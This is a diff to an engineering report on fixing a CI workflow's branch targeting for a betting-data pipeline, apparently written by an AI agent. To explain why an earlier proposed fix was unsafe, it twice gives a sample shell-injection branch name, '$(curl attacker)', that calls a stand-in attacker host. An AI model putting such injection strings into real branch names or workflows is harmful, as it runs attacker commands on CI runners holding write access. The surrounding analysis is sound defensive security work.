@@ -469,12 +469,19 @@ properties are asserted by test.
 
 1. **The 2026-09-01…09-06 restore is still outstanding** (§6). The gate stays red
    until it runs.
-2. **`clv-update.yml` cannot be rehearsed off `main`.** It calls
-   `git_data_commit.py` without `--branch`, defaulting to `main`, so a
-   feature-branch dispatch would push production data to `main`. The settlement
-   chain has **no safe end-to-end rehearsal path** — a direct contributor to CR-2
-   shipping. Fix: pass `--branch ${{ github.ref_name }}`. Not done here because
-   it changes production push behavior beyond Wave 0's remit.
+2. ~~**`clv-update.yml` cannot be rehearsed off `main`.**~~ **✅ Closed by Wave
+   0.05** — see §16. It called `git_data_commit.py` without `--branch`,
+   defaulting to `main`, so a feature-branch dispatch pushed production data to
+   `main`. The settlement chain had **no safe end-to-end rehearsal path** — a
+   direct contributor to CR-2 shipping.
+
+   **The fix this report originally proposed was itself unsafe.** Wave 0 wrote
+   "pass `--branch ${{ github.ref_name }}`". Git permits `$`, backticks, `;`,
+   `&` and `|` in branch names, and a `${{ }}` expression is substituted into a
+   `run:` body *before* the shell parses it — so a branch named
+   `$(curl attacker)` would execute on a runner holding `contents: write`.
+   Wave 0.05 implements the safe form instead: context passed via `env:`, and a
+   fail-closed resolver that constrains the name to `[A-Za-z0-9._/-]`.
 3. **Three production scripts execute on import.** `build_kalshi_registry.py`,
    `merge_odds.py` and `enrich_data.py` have no `if __name__ == "__main__":`
    guard. Importing `build_kalshi_registry` **rewrites**
@@ -631,5 +638,159 @@ treated as a defect — not as permission to stop looking.
 
 ---
 
-*Wave 0 complete. Wave 1 — executable pricing (CR-1/CR-5), doubleheader slate
-identity (CR-3) — is not started and is not authorized by this document.*
+## 16. Wave 0.05 — safe non-`main` rehearsal path for `clv-update.yml`
+
+Closes blind spot §12.2, the last thing standing between Wave 0 and the
+six-date production restore. Operational safety only; no model, pricing,
+calibration, staking, eligibility, settlement-formula or CLV-formula change.
+
+### Behavior before
+
+`clv-update.yml`'s commit step called `scripts/ci/git_data_commit.py` with
+`--message` and a path list, and **no `--branch`**. That argument defaults to
+`'main'` (`git_data_commit.py:591`) and the push is
+`git push origin HEAD:<branch>` (`git_data_commit.py:552`). Meanwhile
+`actions/checkout@v4` carries no `ref:`, so it checks out `github.ref` — the
+dispatched branch.
+
+The result was the worst available shape: **compute on the feature branch,
+publish to `main`.** Every dispatch, from any ref, wrote to production.
+
+### Behavior after
+
+| Event | Ref | Persists to |
+|---|---|---|
+| `schedule` | default branch | default branch — **unchanged** |
+| `workflow_dispatch` | `main` | `main` (intentional production use) |
+| `workflow_dispatch` | any feature branch | **that branch only** |
+| `push` | the pushed branch | that branch |
+| anything else | — | **fails closed, writes nothing** |
+
+The target is always the ref the run is executing on, so a run can only write
+where it came from.
+
+### Why not the one-line `--branch ${{ github.ref_name }}`
+
+Two reasons, both load-bearing:
+
+1. **Injection.** Git permits `$`, backticks, `;`, `&`, `|`, `(`, `)` in ref
+   names. A `${{ }}` expression is substituted into the `run:` body *before*
+   the shell parses it, so a branch named `$(curl attacker)` executes on a
+   runner holding `contents: write`. Context now arrives through `env:`, and
+   `scripts/ci/resolve_commit_branch.py` independently constrains the name to
+   `[A-Za-z0-9._/-]` — a charset with no shell metacharacter — additionally
+   rejecting a leading `-` (parsed as a git option), `..`, `//`, empty path
+   components, a trailing `.lock`, and `HEAD`.
+2. **Ambiguity.** `github.ref_name` is meaningful only when the ref is a branch
+   and the event's ref identifies the write target. A tag ref, an unrecognized
+   event, or a `schedule` firing off the default branch are states where the
+   correct target is genuinely unknown. Each **fails the job** rather than
+   falling back to the default branch — falling back is the defect itself.
+
+The resolver step runs **before** any computation, so a rejected target costs
+no API quota and produces no output it cannot persist.
+
+### Tests
+
+`tests/test_clv_update_branch_targeting.py` — 47 cases:
+
+| Requirement | Guard |
+|---|---|
+| Scheduled runs still target the default branch | `test_scheduled_run_still_targets_the_default_branch` (+ a non-`main` default) |
+| Dispatch on a feature branch targets that branch | `test_workflow_dispatch_on_a_feature_branch_targets_that_branch` |
+| Dispatch on `main` may still write to `main` | `test_workflow_dispatch_on_main_may_still_write_to_main` |
+| A rehearsal can never write to `main` | `test_feature_branch_rehearsal_never_resolves_to_the_default_branch` (4 branch shapes) |
+| Ambiguity fails instead of defaulting | `test_ambiguous_state_raises_instead_of_defaulting_to_main` (10 states) |
+| No shell injection | `test_malformed_or_injecting_branch_names_are_rejected` (18 payloads) + `test_resolver_step_passes_context_by_env_not_by_interpolation` |
+| Failure emits no usable branch | `test_the_resolver_process_exits_nonzero_and_prints_nothing_usable_on_failure` |
+| Commit allow-list unchanged | `test_commit_file_allow_list_is_byte_for_byte_unchanged` |
+| Wave 0 durability preserved | `test_commit_step_still_persists_output_when_a_later_step_fails` |
+| No decision-surface change | `test_wave_0_05_touches_no_model_pricing_or_settlement_file` |
+
+**Mutation-tested.** Removing `--branch` fails
+`test_the_resolver_is_what_the_commit_step_actually_uses`; hard-coding
+`--branch main` fails the same guard; making the resolver fall back to the
+default branch instead of raising fails two `test_ambiguous_state_*` cases.
+
+### 16.1 Live rehearsal — Actions run `34193057325`
+
+`clv-update.yml` dispatched on `claude/wave-0-05-clv-rehearsal-path` with
+`date=2026-09-01`. **All 13 steps `success`.** Run began at main
+`a086f71d`; the branch went `cd08fbff` → `2c70c5d5`.
+
+**Branch targeting worked.** From the runner log, verbatim:
+
+```
+python3 scripts/ci/git_data_commit.py \
+  --message "clv update + rule71 report 2026-09-08 02:04 ET" \
+  --branch "claude/wave-0-05-clv-rehearsal-path" \
+  bets.json BET_LOG.md data/identity_audit.json data/rule71_report.json data/clv_report.json
+Push succeeded (attempt 1).
+```
+
+`main` moved `a086f71d` → `8fd70cd8` during the window, from **four
+`github-actions[bot]` scheduled data commits** (wager research rebuild,
+postgame settlement, daily report, corpus compaction) — all data-only, none
+from this run. `git merge-base --is-ancestor 2c70c5d5 origin/main` → **NO**:
+the rehearsal has **zero commit ancestry on `main`**.
+
+**CR-2 confirmed fixed in real Actions.** The step that raised
+`ModuleNotFoundError: No module named 'lib'` on six consecutive nights ran
+clean and produced real output:
+
+```
+[snapshot_clv] date=2026-09-01  snapshot=kalshi_search_2026-09-01.json
+               fetched_at=2026-09-02T02:18:07.000Z  tickers=2909
+```
+
+**Credential normalization confirmed.** `Fetching scores (daysFrom=8)...` came
+back `HTTP 422 INVALID_SCORES_DAYS_FROM` — a real HTTP response from the Odds
+API. Before Wave 0 the trailing whitespace made `http.client` raise
+`InvalidURL` locally with no socket opened and no status code at all. A 422
+proves the URL was built, sent and authenticated.
+
+### 16.2 Two findings that block the six-date restore as planned
+
+The rehearsal exists to find exactly this, and it did — without touching
+production.
+
+**1. The Odds API cannot reach back far enough.** `clv_update.fetch_scores`
+computes `days_from = max(1, days_ago + 1)` (`clv_update.py:438`) and the
+Odds API `/scores` endpoint caps `daysFrom` at **3**. Run on 2026-09-08:
+
+| Date | `daysFrom` | Result |
+|---|---:|---|
+| 2026-09-01 | 8 | **HTTP 422** (observed) |
+| 2026-09-02 | 7 | HTTP 422 |
+| 2026-09-03 | 6 | HTTP 422 |
+| 2026-09-04 | 5 | HTTP 422 |
+| 2026-09-05 | 4 | HTTP 422 |
+| 2026-09-06 | 3 | within cap |
+
+`statsapi.mlb.com` is wired **only** for F5 linescore settlement
+(`clv_update.py:332-428`); full-game settlement has a single source,
+`fetch_scores()` at `clv_update.py:1477`, with **no fallback**. So five of the
+six dates cannot be settled by the canonical path today. Every day of further
+delay moves another date out of reach.
+
+**2. The root ledger has almost nothing in the window.** Bets in `bets.json`
+dated 2026-09-01…09-06: **one**, on 2026-09-02 (non-terminal). 2026-09-01 and
+09-03…09-06 have **zero**. The rehearsal therefore exercised the plumbing
+fully but the settlement arithmetic not at all (`Bets for 2026-09-01: 0`).
+
+This does **not** mean the restore is unnecessary — the missing
+`data/edgelab/settlements/<date>.jsonl` partitions are the canonical EdgeLab
+corpus written by `edgelab-postgame.yml` from *recommendations*, which is a
+different population from the root wager ledger. It does mean the restore's
+scope and expected effect should be re-derived from the canonical corpus
+before it is authorized, rather than assumed from the root ledger.
+
+**Neither finding is fixed here.** Both touch settlement sourcing, which is
+outside Wave 0.05's remit. They are reported for the CEO's restore decision.
+
+---
+
+*Wave 0 complete. Wave 0.05 adds the rehearsal path only. The six-date
+production restore is NOT started and awaits CEO review. Wave 1 — executable
+pricing (CR-1/CR-5), doubleheader slate identity (CR-3), engine consolidation
+(CR-6) — is not started and is not authorized by this document.*
